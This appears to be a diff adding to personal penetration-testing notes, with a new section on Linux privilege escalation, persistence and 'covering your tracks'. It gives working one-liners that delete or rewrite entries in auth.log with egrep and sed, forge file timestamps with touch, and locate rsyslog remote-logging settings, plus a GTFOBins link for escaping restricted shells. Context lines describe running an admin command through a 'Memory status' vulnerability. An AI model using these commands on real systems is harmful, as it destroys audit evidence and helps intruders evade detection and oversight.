@@ -532,20 +532,33 @@ To run a command as admin using the Memory status vulnerability
                                       |                  This is the admin privilege level command                            |
 - scp into where the Memory status gets executed from and restart the computer, the command executes
 
+*******************************************************************************************************************************************************************************************************
+                                                       Privilege Escalation, Persistence & Covering Your Tracks
+                                                                                Linux
+Sudo config file /etc/sudoers
 
+GTFO Bins: https://gtfobins.github.io/gtfobins/tcpdump/    comands we can still use when in a restricte shell
 
+logs in /var/log
+GREP (Remove)
+egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
+SED (Replace)
+cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
 
+Easy with Nix is Windows (Native change of Access & Modify times)
+touch -c -t 201603051015 1.txt   # Explicit
+touch -r 3.txt 1.txt    # Reference
 
+Rsyslog
+Newer Rsyslog references /etc/rsyslog.d/* for settings/rules
+Older version only uses /etc/rsyslog.conf
+Find out
+grep "IncludeConfig" /etc/rsyslog.conf
+proof of remote login when looking in rsyslog.conf    @@ 514
 
-
-
-
-
-
-
-
-
-
+Reading Rsyslog
+Utilizes severity (priority) and facility levels
+<facility>.<priority>
 
 
 
